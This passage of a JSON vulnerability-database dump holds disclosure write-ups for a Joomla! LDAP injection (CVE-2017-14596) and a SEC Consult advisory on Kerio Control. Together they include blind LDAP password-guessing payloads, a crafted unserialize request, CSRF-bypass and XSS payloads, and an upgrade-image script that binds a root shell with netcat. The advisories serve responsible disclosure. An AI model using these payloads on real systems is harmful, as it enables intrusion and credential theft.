hijacked information to login to the administrator control panel and to take over the Joomla! installation, as well as potentially the web server, by uploading custom Joomla! extensions for remote code execution.\r\n\r\n\r\nVulnerability Analysis - CVE-2017-14596\r\nOur code analysis solution RIPS automatically identified the vulnerability that spans over the following nested code lines. First, in the LoginController the Joomla! application receives the user-supplied credentials from the login form.\r\n\r\n/administrator/components/com_login/controller.php\r\nclass LoginController extends JControllerLegacy\r\n{\r\n    public function login()\r\n    {\r\n        \u22ee\r\n        $app = JFactory::getApplication();\r\n        \u22ee\r\n        $model = $this->getModel('login');\r\n        $credentials = $model->getState('credentials');\r\n        \u22ee\r\n        $app->login($credentials, array('action' => 'core.login.admin'));\r\n    }\r\n}\r\n \r\nThe credentials are passed on to the login method which then invokes the authenticate method.\r\n\r\n/libraries/cms/application/cms.php\r\nclass JApplicationCms extends JApplicationWeb\r\n{\r\n    public function login($credentials, $options = array())\r\n    {\r\n        \u22ee\r\n        $authenticate = JAuthentication::getInstance();\r\n        $authenticate->authenticate($credentials, $options);\r\n    }\r\n}\r\n \r\n/libraries/joomla/authentication/authentication.php\r\nclass JAuthentication extends JObject\r\n{\r\n    public function authenticate($credentials, $options = array())\r\n    {\r\n    \u22ee\r\n        $plugin->onUserAuthenticate($credentials, $options, $response);\r\n    }\r\n}\r\n \r\nBased on the plugin that is used for authentication, the authenticate method passes the credentials to the onUserAuthenticate method. If Joomla! is configured to use LDAP for authentication, the LDAP plugin\u2019s method is invoked.\r\n\r\n/plugins/authentication/ldap/ldap.php\r\nclass PlgAuthenticationLdap extends JPlugin\r\n{\r\n    public function onUserAuthenticate($credentials, $options, &amp;$response)\r\n    {\r\n        \u22ee\r\n        $userdetails = $ldap->simple_search(\r\n            str_replace(\r\n                '[search]',\r\n                $credentials['username'],\r\n                $this->params->get('search_string')\r\n            )\r\n        );\r\n    }\r\n}\r\n \r\nIn the LDAP plugin, the username credential is embedded into the LDAP query specified in the search_string option. According to the official Joomla! documentation, the search_string configuration option is \u201ca query string used to search for the user, where [search] is directly replaced by search text from the login field\u201d, for example \u201cuid=[search]\u201c. The LDAP query is then passed to the simple_search method of the LdapClient which connects to the LDAP server and performs the ldap_search.\r\n\r\n/libraries/vendor/joomla/ldap/src/LdapClient.php\r\nclass LdapClient\r\n{\r\n    public function simple_search($search)\r\n    {\r\n        $results = explode(';', $search);\r\n        foreach ($results as $key => $result)\r\n        {\r\n            $results[$key] = '(' . $result . ')';\r\n        }\r\n        return $this->search($results);\r\n    }\r\n\r\n    public function search(array $filters, ...)\r\n    {\r\n        foreach ($filters as $search_filter)\r\n        {\r\n            $search_result = @ldap_search($res, $dn, $search_filter, $attr);\r\n            \u22ee\r\n        }\r\n    }\r\n}\r\n\r\n\r\n \r\nEven if RIPS is unaware of the exact LDAP query that is loaded from an external configuration file, RIPS detects and reports successfully the root cause of this vulnerability: User input is mixed unsanitized with LDAP query markup that is passed to the sensitive ldap_search function. The vulnerability was detected within 7 minutes in half a million lines of Joomla! code.\r\n\r\nThe truncated analysis results are available in our RIPS demo application. Please note that we limited the results to the issues described in this post in order to ensure a fix is available.\r\n\r\n See RIPS report\r\nProof Of Concept - Blind LDAP Injection\r\nThe lack of input sanitization of the username credential used in the LDAP query allows an adversary to modify the result set of the LDAP search. By using wildcard characters and by observing different authentication error messages, the attacker can literally search for login credentials progressively by sending a row of payloads that guess the credentials character by character.\r\n\r\n\r\nXXX;(&amp;(uid=Admin)(userPassword=A*))\r\nXXX;(&amp;(uid=Admin)(userPassword=B*))\r\nXXX;(&amp;(uid=Admin)(userPassword=C*))\r\n...\r\nXXX;(&amp;(uid=Admin)(userPassword=s*))\r\n...\r\nXXX;(&amp;(uid=Admin)(userPassword=se*))\r\n...\r\nXXX;(&amp;(uid=Admin)(userPassword=sec*))\r\n...\r\nXXX;(&amp;(uid=Admin)(userPassword=secretPassword))\r\n\r\nEach of these payloads yield exactly one out of two possible states which allow an adversary to abuse the server as an Oracle. A filter bypass is necessary for exploitation that is not covered in this blog post. With an optimized version of these payloads one bit per request can be extracted from the LDAP server which results in a highly efficient blind LDAP injection attack.\r\n\r\n\r\nTime Line\r\nDate\tWhat\r\n2017/07/27\tProvided vulnerability details and PoC to vendor\r\n2017/07/29\tVendor confirmed security issue\r\n2017/09/19\tVendor released fixed version\r\n\r\n\r\nSummary\r\nAs one of the most popular open source CMS applications, Joomla! receives many code reviews from the security community. Yet alone one missed security vulnerability in the 500,000 lines of code can lead to a server compromise. With the help of static code analysis, RIPS detected a critical LDAP injection vulnerability (CVE-2017-14596) that remained undiscovered for over 8 years. The vulnerability allows an attacker to steal login credentials from Joomla! installations that use LDAP authentication.\r\n\r\nWe would like to thank the Joomla! Security Strike Team for an excellent coordination and remediation of this issue and recommend to update to the latest Joomla! version 3.8 immediately.\n\n#  0day.today [2018-04-03]  #",
            "cvss": {
                "score": 5.0,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:NONE/A:NONE/"
            },
            "vhref": "https://vulners.com/zdt/1337DAY-ID-28621"
        },
        {
            "bulletinFamily": "exploit",
            "description": "## Joomla! 3.7.5 - Takeover in 20 Seconds with LDAP Injection\n\nWith over 84 million downloads, Joomla! is one of the most popular content management systems in the World Wide Web. It powers about 3.3% of all websites\u2019 content and articles. Our code analysis solution RIPS detected a previously unknown LDAP injection vulnerability in the login controller. This one vulnerability could allow remote attackers to leak the super user password with blind injection techniques and to fully take over any Joomla! &lt;= 3.7.5 installation within seconds that uses LDAP for authentication. Joomla! has fixed the vulnerability in the latest version 3.8.\n\n### Requirements - Who is affected\n\nInstallations with the following requirements are affected by this vulnerability:\n\n  * Joomla! version 1.5 &lt;= 3.7.5 is installed\n  * Joomla! is configured to use LDAP for authentication\n\nThis is not a configuration flaw, and an attacker does not need any privileges to exploit this vulnerability.\n\n### Impact - What can an attacker do\n\nBy exploiting a vulnerability in the login page, an unprivileged remote attacker can efficiently extract all authentication credentials of the LDAP server that is used by the Joomla! installation. These include the username and password of the super user, the Joomla! administrator. An attacker can then use the hijacked information to login to the administrator control panel and to take over the Joomla! installation, as well as potentially the web server, by uploading custom Joomla! extensions for remote code execution.\n\n### Vulnerability Analysis - CVE-2017-14596\n\nOur code analysis solution RIPS automatically identified the vulnerability that spans over the following nested code lines. First, in the `LoginController ` the Joomla! the application receives the user-supplied credentials from the login form.\n\n`/administrator/components/com_login/controller.php` `class LoginController extends JControllerLegacy { public function login() { \u22ee $app = JFactory::getApplication(); \u22ee $model = $this->getModel('login'); $credentials = $model->getState('credentials'); \u22ee $app->login($credentials, array('action' => 'core. login. admin')); } }`\n\nThe credentials are passed on to the `login ` method which then invokes the `authenticate ` method.\n\n`/libraries/cms/application/cms.php` `class JApplicationCms extends JApplicationWeb { public function login($credentials, $options = array()) { \u22ee $authenticate = JAuthentication::getInstance(); $authenticate->authenticate($credentials, $options); } }`\n\n`/libraries/joomla/authentication/authentication.php` `class JAuthentication extends JObject { public function authenticate($credentials, $options = array()) { \u22ee $plugin->onUserAuthenticate($credentials, $options, $response); } }`\n\nBased on the plugin that is used for authentication, the `authenticate ` method passes the credentials to the `onUserAuthenticate ` method. If Joomla! is configured to use LDAP for authentication, the LDAP plugin's method is invoked.\n\n`/plugins/authentication/ldap/ldap.php` `class PlgAuthenticationLdap extends JPlugin { public function onUserAuthenticate($credentials, $options, &$response) { \u22ee $userdetails = $ldap->simple_search( str_replace( '[search]', $credentials['username'], $this->params->get('search_string') ) ); } }`\n\nIn the LDAP plugin, the `username ` credential is embedded into the LDAP query specified in the `search_string ` option. According to the official [Joomla! documentation](<https://docs.joomla.org/LDAP_Authentication>), the `search_string ` configuration option is \u201ca query string used to search for the user, where [search] is directly replaced by the search text from the login field\u201d, for example \u201cuid=[search]\u201c. The LDAP query is then passed to the `simple_search ` method of the `LdapClient ` which connects to the LDAP server and performs the `ldap_search`.\n\n`/libraries/vendor/joomla/ldap/src/LdapClient.php` `` class LdapClient { public function simple_search($search) { $results = explode(';', $search); foreach ($results as $key =&gt; $result) { $results[$key] = '(' . $result . ')'; } return $this-&gt;search($results); }\n    \n    \n    public function search(array $filters, ...)\n    {\n     foreach ($filters as $search_filter)\n    {\n     $search_result = @ldap_search($res, $dn, $search_filter, $attr);\n    \u22ee\n    }\n    }\n    \n\n} ``\n\nEven if RIPS is unaware of the exact LDAP query that is loaded from an external configuration file, RIPS detects and reports successfully the root cause of this vulnerability: User input is mixed unsanitized with the LDAP query markup that is passed to the sensitive `ldap_search ` function. The vulnerability was detected within 7 minutes in half a million lines of Joomla! code.\n\nThe truncated analysis results are available in our RIPS demo application. Please note that we limited the results to the issues described in this post in order to ensure a fix is available.\n\n[See RIPS report](<https://demo.ripstech.com/projects/joomla_3.7.5>)\n\n### Proof Of Concept - Blind LDAP Injection\n\nThe lack of input sanitization of the username credential used in the LDAP query allows an adversary to modify the result set of the LDAP search. By using wildcard characters and by observing different authentication error messages, the attacker can literally search for the login credentials progressively by sending a row of payloads that guess the credentials character by character. `XXX;(&(uid=Admin)(userPassword=A*)) XXX;(&(uid=Admin)(userPassword=B*)) XXX;(&(uid=Admin)(userPassword=C*)) ... XXX;(&(uid=Admin)(userPassword=s*)) ... XXX;(&(uid=Admin)(userPassword=se*)) ... XXX;(&(uid=Admin)(userPassword=sec*)) ... XXX;(&(uid=Admin)(userPassword=secretPassword))`\n\nEach of these payloads yield exactly one out of two possible states which allow an adversary to abuse the server as an Oracle. A filter bypass is necessary for exploitation that is not covered in this blog post. With an optimized version of these payloads, one bit per request can be extracted from the LDAP server which results in a highly efficient blind LDAP injection attack.\n\n### Time Line\n\n  * 2017/07/27 Provided vulnerability details and PoC to vendor\n  * 2017/07/29 Vendor confirmed the security issue\n  * 2017/09/19 Vendor released fixed version\n\n### Summary\n\nAs one of the most popular open source CMS applications, Joomla! receives many code reviews from the security community. Yet alone one missed security vulnerability in the 500,000 lines of code can lead to a server compromise. With the help of [static code analysis](<https://www.ripstech.com/php-security-analysis/#static>), RIPS detected a critical LDAP injection vulnerability (CVE-2017-14596) that remained undiscovered for over 8 years. The vulnerability allows an attacker to steal login credentials from Joomla! installations that use LDAP authentication.\n\nWe would like to thank the Joomla! Security Strike Team for an excellent coordination and remediation of this issue and recommend to update to the latest Joomla! version 3.8 immediately.\n\n#### Video demo address:\n\nhttp://v.youku.com/v_show/id_XMzAzNjQxNjM4MA==.html\n",
            "modified": "2017-09-21T00:00:00",
            "published": "2017-09-21T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-96561",
            "id": "SSV:96561",
            "type": "seebug",
            "title": "Joomla! 3.7.5  LDAP injection vulnerability(CVE-2017-14596)",
            "sourceData": "",
            "cvss": {
                "score": 5.0,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:NONE/A:NONE/"
            },
            "vhref": "https://vulners.com/seebug/SSV:96561"
        }
    ],
    "CVE-2014-8142": [
        {
            "bulletinFamily": "exploit",
            "description": "",
            "modified": "2016-09-22T00:00:00",
            "published": "2016-09-22T00:00:00",
            "href": "https://packetstormsecurity.com/files/138812/Kerio-Control-Unified-Threat-Management-Code-Execution-XSS-Memory-Corruption.html",
            "id": "PACKETSTORM:138812",
            "type": "packetstorm",
            "title": "Kerio Control Unified Threat Management Code Execution / XSS / Memory Corruption",
            "sourceData": "`SEC Consult has also released a blog post describing the attack scenarios  \nof the vulnerabilities within this advisory in detail and a video which  \nshows the remote attack. Exploit code has been developed as well but will  \nnot be released for now.  \n  \nBlog:  \nhttp://blog.sec-consult.com/2016/09/controlling-kerio-control-when-your.html  \n  \nVideo:  \nhttps://www.youtube.com/watch?v=y_OWz25sHMI  \n  \n  \nSEC Consult Vulnerability Lab Security Advisory < 20160922-0 >  \n=======================================================================  \ntitle: Potential backdoor access through multiple vulnerabilities  \nproduct: Kerio Control Unified Threat Management  \nvulnerable version: <9.1.3, verified in version 9.1.0 build 1087 and 9.1.1  \nbuild 1324  \nfixed version: 9.1.3 (partially fixed, see vendor statement below)  \nCVE number: -  \nimpact: critical  \nhomepage: http://www.kerio.com/  \nfound: 2016-08-24  \nby: R. Freingruber (Office Vienna)  \nR. Tavakoli (Office Vienna)  \nSEC Consult Vulnerability Lab  \n  \nAn integrated part of SEC Consult  \nBangkok - Berlin - Linz - Montreal - Moscow  \nSingapore - Vienna (HQ) - Vilnius - Zurich  \n  \nhttps://www.sec-consult.com  \n  \n=======================================================================  \n  \nVendor description:  \n-------------------  \n\"Protect your network from viruses, malware and malicious activity  \nwith Kerio Control, the easy-to-administer yet powerful all-in-one  \nsecurity solution.  \nKerio Control brings together next-generation firewall capabilities -  \nincluding a network firewall and router, intrusion detection and  \nprevention (IPS), gateway anti-virus, VPN, and web contentand  \napplication filtering. These comprehensive capabilities and unmatched  \ndeployment flexibility make Kerio Control the ideal choice for small  \nand mid-sized businesses.\"  \n  \nSource: http://www.kerio.com/products/kerio-control  \n  \n  \nBusiness recommendation:  \n------------------------  \nBy combining the vulnerabilities documented in this advisory an attacker  \ncan fully compromise a network which uses the Kerio Control appliance for  \nprotection.  \n  \nThe attacker can trick a victim to visit a malicious website which then conducts  \nthe internal attack. The attacked victim must be logged in or weak credentials  \nmust be configured which can be found with a bruteforce attack.  \n  \nThe attacker will gain a reverse root shell from the Internet to the internal  \nKerio Control firewall system. Moreover, it's possible that an internal attacker  \nuses the described vulnerabilities to escalate his privileges (low privileged  \naccount to full root shell) to steal credentials from other users on the UTM  \nappliance.  \n  \nMost vulnerabilities (RCE, CSRF bypasses, XSS, Heap Spraying) were found  \nin just two PHP scripts. Both scripts are not referenced by any other  \nPHP script nor by any binary on the system.  \nBoth scripts contain a different(!), seemingly deliberate(?) CSRF bypass  \nwhich make the vulnerabilities exploitable from the Internet to obtain a  \nreverse root shell.  \n  \nSEC Consult recommends not to use Kerio Control until a thorough security  \nreview has been performed by security professionals and all identified  \nissues have been resolved.  \n  \n  \nVulnerability overview/description:  \n-----------------------------------  \n1) Unsafe usage of the PHP unserialize function and outdated PHP version leads  \nto remote-code-execution  \nAn authenticated user (standard user or administrator) can control data, which  \ngets later unserialized. Kerio Control uses PHP 5.2.13 which was released on  \n2010-02-25. This version is more than 6 years old and several bugs were found  \nin the meantime within the unserialize function. The following CVE numbers  \nare just some examples for vulnerabilities in unserialize which lead to remote  \ncode execution:  \n-) CVE-2014-8142  \n-) CVE-2014-3515  \n-) CVE-2015-0231  \n-) CVE-2015-6834  \n-) CVE-2016-5771  \n-) CVE-2016-5773  \n  \nPHP 5.2.13 is especially affected by CVE-2014-3515. This vulnerability uses a  \ntype confusion attack to trigger a use-after-free vulnerability. It can be used  \nto read data and get full code execution. In the case of Kerio Control the  \nresult of unserialize is not reflected back to the attacker. It's therefore not  \npossible to read memory from the stack or heap (e.g. to bypass ASLR).  \n  \nNevertheless, SEC Consult developed a fully working and reliable (blind) exploit  \nfor this vulnerability which spawns a reverse root shell to the Kerio Control  \nsystem.  \nFor this exploit a user account is required. However, it's also possible to  \nconduct the attack via the Internet because the CSRF (Cross Site Request  \nForgery) check can be bypassed (see below).  \n  \nAn attacker can use this vulnerability to break into a company network via the  \nInternet by tricking a logged in user to visit a malicious website. Even if the  \nuser is currently not logged in the attacker can start a bruteforce attack to  \nobtain valid credentials to conduct the attack.  \n  \n  \n2) PHP script allows heap spraying  \nOne of the PHP scripts allows the allocation of memory inside the main binary  \n(winroute) of Kerio Control. Winroute contains the code of most services  \n(e.g. the webserver, PHP, network related functionality, ...).  \nThe memory will not be freed after finishing the request and can therefore be  \nused to spray payloads to the whole memory space.  \n  \nThis vulnerability was used in the overall exploit to defeat ASLR.  \nPlease bear in mind that it's very likely that an attacker can write a working  \nexploit without heap spraying. Fixing this vulnerability would therefore not  \nprevent the exploitation of the remote code execution vulnerability.  \nFor example, the information disclosure vulnerability from this advisory can  \nbe used to bypass ASLR as well. This would eliminate the need of heap spraying.  \n  \n  \n3) CSRF Protection Bypass  \nThe PHP scripts contain code to protect against CSRF (Cross Site Request  \nForgery) attacks. Because of the wrong usage of PHP binary  \noperations and comparisons it's possible to bypass this check. That means  \nthat an attacker can trigger requests from other websites which will be handled  \nby Kerio Control. This vulnerability allows to exploit the remote code  \nexecution vulnerability from the Internet to break into a network.  \n  \n  \n4) Webserver running with root privileges  \nThe main binary (which contains the webserver and PHP) runs with root  \nprivileges.  \n  \nKerio told SEC Consult that this vulnerability will not be fixed. SEC  \nConsult strongly recommended otherwise.  \n  \n  \n5) Reflected Cross Site Scripting (XSS)  \nKerio Control does not properly encode parameters which are reflected on the  \nwebsite. This leads to cross site scripting vulnerabilities.  \nAn attacker can abuse these vulnerabilities to modify the website or do actions  \nin the context of the attacked user.  \n  \n  \n6) Missing memory corruption protections  \nThe main binary (winroute) is not compiled as position-independent executable  \n(PIE). This allowed the use of ROP (return-oriented-programming) code to  \nbypass the not executable heap. Moreover, the stack is per default marked as  \nexecutable, but the exact location of the stack is randomized by ASLR.  \n  \n  \n7) Information Disclosure leads to ASLR bypass  \nOne of the PHP scripts leaks pointers to the stack and heap.  \nThis can be abused by attackers to bypass ASLR.  \nBecause stacks are marked as executable an attacker can therefore easily bypass  \nASLR and DEP/NX.  \n  \n  \n8) Remote Code Execution as administrator  \nNearly a year ago on 2015-10-12 Raschin Tavakoli reported a remote code  \nexecution vulnerability in the administrative web interface in the upgrade  \nfunctionality. This vulnerability is still unfixed, only the associated XSS  \nvulnerability was fixed. However, an attacker can still exploit it from the  \nInternet, e.g. by abusing the XSS vulnerability described in this advisory  \n(where the CSRF check can be bypassed).  \n  \nWith this vulnerability an attacker can gain a reverse root shell on  \nKerio Control again if a logged in administrator visits a malicious website  \non the Internet.  \nMore information can also be found in the old advisory:  \nhttps://www.exploit-db.com/exploits/38450/  \n  \n  \n9) Login not protected against brute-force attacks  \nThere are no bruteforce protections in place for the login.  \nIf an unauthenticated victim visits an attacker's website, the attacker can  \nstart a bruteforce attack to obtain valid credentials to execute the  \nremote code execution exploit. Via image-loading the attacker can detect if  \nthe current credentials are valid (without violating SOP).  \n  \n  \nProof of concept:  \n-----------------  \n1) Unsafe usage of the PHP unserialize function and outdated PHP version leads  \nto remote-code-execution  \nThe following request can be used to set the unserialize data. In this example  \na faked string is used which points to 0xffffffff (kernel memory). Unserializing  \nit will therefore crash the remote webserver (the winroute process).  \n  \nPOST /set.php HTTP/1.1  \nHost: $IP:4081  \nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  \nCookie: SESSION_CONTROL_WEBIFACE=<valid session ID>;  \nConnection: close  \nContent-Type: application/x-www-form-urlencoded  \nContent-Length: 730  \n  \nk_securityHash=x&target=k_sessionVariable&k_variable=lastDisplayed&k_value=a:18:{s:8:\"k_dbName\";s:5:\"error\";s:11:\"k_dbSummara\";s:3:\"abc\";s:14:\"k_dbIndividual\";s:3:\"abc\";s:16:\"k_dbLastUsedType\";s:3:\"abc\";s:10:\"k_dbLayout\";s:3:\"abc\";s:10:\"k_pageType\";s:3:\"abc\";s:13:\"k_periodStart\";i:123;s:11:\"k_periodEnd\";i:123;s:8:\"k_userId\";i:123;s:6:\"tabBar\";i:123;s:13:\"k_gotoElement\";i:123;s:9:\"k_protoId\";i:123;s:11:\"k_errorType\";i:123;s:16:\"k_timezoneOffset\";i:123;s:9:\"k_groupId\";i:123;s:2:\"id\";i:123;s:11:\"k_dbSummary\";C:16:\"SplObjectStorage\":152:{x:i:2;O:8:\"stdClass\":1:{i:0;a:2:{i:1;i:1;i:2;i:2;}};d:2.0851592721051977e-262;;m:a:2:{i:0;S:15:\"\\ff\\ff\\ff\\ff\\20\\00\\00\\00\\01\\00\\00\\00\\06\\00\\00\";i:1;R:3;}}s:18:\"k_historyTimestamp\";s:3:\"abc\";}  \n  \nThe following request will call unserialize on the injected data:  \n  \nGET /contentLoader.php?k_getHistoryId=1&k_securityHash=x HTTP/1.1  \nHost: $IP:4081  \nCookie: SESSION_CONTROL_WEBIFACE=<valid session ID>;  \nConnection: close  \n  \nIn the example above only a denial of service will be conducted. However, an  \nattacker can change the data type to object to get full code execution on  \nthe remote system.  \n  \nSEC Consult developed a fully working exploit for this attack which spawns a  \nroot shell. Please note that this exploit was intentionally written to just  \ntarget Kerio Control 9.1.0 Build 1087. This is because hardcoded offsets  \nare used which belong to the winroute binary with the SHA256 hash:  \n2808c35528b9a4713b91f65a881dfca03088de08b6331fdee1c698523bd757b0  \nThis exploit will not be released for now.  \n  \nA real-world-attacker can detect the remote binary version by bruteforcing  \nthe object handler related to CVE-2014-3515.  \n  \n  \n2) PHP script allows heap spraying  \nThe set.php script contains the following code:  \n$p_variable = urldecode($_POST['k_variable']);  \n$p_value = urldecode($_POST['k_value']);  \n...  \n$p_session->setSessionVariable($p_variable, $p_value);  \n  \nPOST requests with the following parameters can therefore be used to allocate  \nspace on the remote system:  \nk_securityHash=x&target=k_sessionVariable&k_variable=<random_name>  \n&k_value=<payload_to_allocate>  \n  \nDuring tests it was possible to spray approximately 400 MB data in 30 seconds  \nwhich is enough to control two predictable addresses on the heap.  \n  \n  \n3) CSRF Protection Bypass  \nTwo scripts are required for the remote code execution exploit:  \n-) set.php  \n-) ContentLoader.php  \nBoth scripts contain different very interesting CSRF check bypasses.  \n  \nThe following code can be found in set.php:  \n$p_session->getCsrfToken(&$p_securityHash);  \n$p_postedHash = $_GET['k_securityHash'] || $_POST['k_securityHash'];  \nif ('' == $p_postedHash || ($p_postedHash != $p_securityHash)) {  \nexit();  \n}  \n  \nSince the programming language is PHP (and not JavaScript), the above code code  \ndoes not work as expected. $p_postedHash can only become 0 or 1 because || is a  \nlogical operator. The if-condition compares the valid token with the posted one  \nvia the != operator, however, this will not check if types are the same.  \nIf k_securityHash is set (either via GET or POST) to any value, the above code  \nwill compare the number 1 with a string, which will always bypass the check.  \nIt's therefore enough to set k_securityHash to any value to bypass the CSRF  \nprotection.  \n  \nThe following code can be found in contentLoader.php:  \n$p_session->getCsrfToken(&$p_securityHash);  \n$p_postedHash = $_GET['k_securityHash'];  \n...  \nif (!$p_session || ('' == $p_postedHash && $p_postedHash != $p_securityHash)) {  \n$p_page = new p_Page();  \n$p_page->p_jsCode('window.top.location = \"index.php\";');  \n$p_page->p_showPageCode();  \ndie();  \n}  \n  \nNow the programmers only use the GET parameter, however, they changed the  \nlogical operator in the if condition from || to && which means that the CSRF  \ncheck will only be applied if $p_postedHash is empty. It's therefore again  \nenough to set k_securityHash to any value to bypass the check.  \n  \n  \n4) Webserver running with root privileges  \nNo proof of concept necessary.  \n  \n  \n5) Reflected Cross Site Scripting (XSS)  \nIn the following request the k_historyTimestamp parameter is prone to XSS:  \nhttps://<IP>:4081/contentLoader.php?k_dbName=x&k_securityHash=x  \n&k_historyTimestamp=aa%22;alert(1)%3b//  \n  \nIn the same request the id parameter can be used to inject JavaScript code.  \nNote that the attack can only be conducted against administrative users.  \nUsers with standard privileges can only access pages with k_dbName set to one  \nof the following values:  \n-) accStats  \n-) prefs  \n-) dialup  \n-) error  \n  \nIn such a case Kerio Control adds code like the following  \n(in this example k_dbName=dialup):  \nvar k_newDbName = \"<kerio:text id=\"tabCaption_dialup\"/>\";  \n  \nThe \" characters within the string are not correctly encoded.  \nThis will lead to the termination of the JavaScript execution. Because the  \ninjected payload is stored after this code, the attacker must bypass this  \ncode to ensure that the payload gets executed. This is only possible if  \nthe attacked user is an administrator because administrators can load any  \ndbName. By setting k_dbName to an invalid dbName (e.g. to 'x'), code like  \nthe following will be added instead (which does not crash):  \nvar k_newDbName = \"\";  \n  \nAnother XSS can be found at:  \nhttps://<IP>:4081/admin/internal/dologin.php?hash=%0D%0A\"><script>alert(1);</script><!--  \n  \n  \n6) Missing memory corruption protections  \nNo proof of concept necessary.  \n  \n  \n7) Information Disclosure leads to ASLR bypass  \nThe following request returns information to the currently logged in user  \n(e.g. session token and username):  \n  \nGET /nonauth/getLoginType.js.php HTTP/1.1  \nHost: $IP:4081  \nCookie: SESSION_CONTROL_WEBIFACE=<valid session ID>;  \nConnection: close  \n  \nThe following is a typical response:  \n  \nHTTP/1.1 200 OK  \nConnection: Close  \nContent-type: text/html  \nDate: Tue, 24 Aug 2016 11:47:34 GMT  \nServer: Kerio Control Embedded Web Server  \nX-UA-Compatible: IE=edge  \n  \nk_loginParams.k_loginType = \"loginUnlock\";k_loginParams.k_nonauthToken =  \n\"0xb59066a8\";k_loginParams.k_sessionToken =  \n\"bc7c9ae78f01e498b7c935b4ad521b664d4e2c5574bde30cdf57851a58763660\";k_loginParams.k_loggedUser  \n= {k_asocName: \"user\", k_fullName: \"user\"};  \n  \nThe above response contains a valid pointer (0xb59066a8). In most cases this  \npointer will point to the heap. However, sometimes this pointer will point  \ninto a readable and writeable region behind a stack-region.  \nThe target location always stores the same data. During the analysis no  \nfurther effort was spent on analysing this behaviour.  \n  \nThe pointer will also be disclosed if the user is already logged out.  \nIn such a case the response looks like:  \n  \nHTTP/1.1 200 OK  \nConnection: Close  \nContent-type: text/html  \nDate: Tue, 24 Aug 2016 12:04:44 GMT  \nServer: Kerio Control Embedded Web Server  \nX-UA-Compatible: IE=edge  \n  \nk_loginParams.k_loginType = \"loginCommon\";k_loginParams.k_nonauthToken =  \n\"0xb2ee208\";  \n  \n  \nAn attack scenario can be:  \n-) The attacker tricks a victim to visit the attacker's malicious website  \n-) The attacker's website uses the CSRF bypass and the identified XSS  \nvulnerability to embed a malicious script inside the Kerio Control website  \n-) The attacker's website iframes the Kerio Control website to trigger the  \nexecution of the XSS payload  \n-) The XSS payload runs on the same domain and can therefore send requests  \nand read responses. This means the attacker can send requests to  \ngetLoginType.js.php to obtain a memory pointer.  \n-) If the memory pointer is within a specific range (e.g. the highest nibble  \nis zero), it's a pointer to the heap. In such a case the RCE vulnerability  \ncan be used to crash and restart the server. After that the same check can  \nbe done again.  \n-) If the memory pointer points near a stack (highest nibble is 0xb), the  \npointer can be used to calculate the base address of a stack.  \n-) Now the attacker knows the location of a stack (all stacks are marked as  \nreadable, writeable and executable). He can now easily bypass ASLR and DEP.  \n  \n  \n8) Remote Code Execution as administrator  \nAn attacker can create a malicious upgrade image with the following  \ncommands:  \ncat upgrade.sh  \n#!/bin/bash  \nnc -lp 9999 -e /bin/bash &  \n  \ntar czf upgrade.tar.gz *  \nmv upgrade.tar.gz upgrade.img  \n  \nThe image can be uploaded in the administrative web interface.  \nThis will bind a root shell on port 9999. The complete attack can also be  \nconducted via the cross site scripting vulnerability described in this  \nadvisory (XSS in contentLoader.php). This enables an attacker to conduct  \nthe attack from the Internet to obtain a reverse shell on Kerio Control.  \n  \n  \n9) Login not protected against brute-force attacks  \nValid credentials can be obtained via a brute-force attack.  \nIt's enough to send a POST request to /internal/dologin.php with the  \nparameters kerio_username and kerio_password set. A remote attacker  \ncan detect if the credentials are correct without reading the  \nresponse (SOP would not allow to read the response). This is possible  \nbecause /internal/photo will only return a valid image if the user is  \ncurrently logged in. The attacker can load an image from this URL and  \ncheck if loading was successful to leak the information if the  \ncredentials are valid or not.  \nThe following code demonstrates this:  \n<img src=\"https://<Kerio-IP>/internal/photo\" onerror=not_logged_in();  \nonload=logged_in();></img>  \n  \n  \nVulnerable / tested versions:  \n-----------------------------  \nThe following product versions were found to be vulnerable which were the  \nlatest versions available at the time of the discovery:  \nv9.1.0 (Build 1087)  \nv9.1.1 (Build 1324)  \n  \n  \nVendor contact timeline:  \n------------------------  \n2016-08-29: Contacting vendor through website  \n(bug report: bugreports@support.kerio.com) Ticket-ID: MYW-768664  \n2016-08-31: No answer, contacting CTO of Kerio via email  \n2016-09-01: Received security contact with PGP & S/MIME certificate  \n2016-09-01: Transmission of PGP encrypted advisory to Kerio  \n2016-09-09: Received answer, Kerio confirms vulnerabilities 1,2,3,5,6,7  \nStatement to vulnerability 9:  \n\"the feature already is in the product.\"  \nStatement to vulnerabilities 4 (Webserver running with root  \nprivileges) and 8 (Remote Code Execution as administrator):  \n\"I do not consider this a vulnerability\"  \nUpdate including a fix will be available on 2016-09-20  \n2016-09-09: SEC Consult informed Kerio to re-think the decision  \nnot fixing the vulnerabilities 4, 8 and 9  \nSEC Consult highly recommends to fix all reported issues  \n2016-09-13: SEC Consult informed Kerio that the advisory will be  \nreleased on 2016-09-22  \n2016-09-20: Kerio releases patch for Kerio Control  \n2016-09-22: Coordianted release of security advisory  \n  \n  \nSolution:  \n---------  \nThe vendor has released version 9.1.3 on 20th September which, according  \nto the vendor, fixes the vulnerabilities 1,2,3,5,6,7.  \n  \nThe vendor told us the following regarding vulnerability 9:  \n\"the feature already is in the product\"  \n  \nVulnerability 4 and 8 are not considered a vulnerability by the vendor  \nand will not be fixed.  \nSEC Consult strongly recommended fixing issue 4 and 8 as well.  \n  \nThe latest version can be downloaded from here:  \nhttp://www.kerio.com/support/kerio-control  \nhttp://www.kerio.com/support/kerio-control/release-history  \n  \n  \nWorkaround:  \n-----------  \nNone  \n  \n  \nAdvisory URL:  \n-------------  \nhttps://www.sec-consult.com/en/Vulnerability-Lab/Advisories.htm  \n  \n  \n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  \n  \nSEC Consult Vulnerability Lab  \n  \nSEC Consult  \nBangkok - Berlin - Linz - Montreal - Moscow  \nSingapore - Vienna (HQ) - Vilnius - Zurich  \n  \nAbout SEC Consult Vulnerability Lab  \nThe SEC Consult Vulnerability Lab is an integrated part of SEC Consult. It  \nensures the continued knowledge gain of SEC Consult in the field of network  \nand application security to stay ahead of the attacker. The SEC Consult  \nVulnerability Lab supports high-quality penetration testing and the evaluation  \nof new offensive and defensive technologies for our customers. Hence our  \ncustomers obtain the most current information about vulnerabilities and valid  \nrecommendation about the risk profile of new technologies.  \n  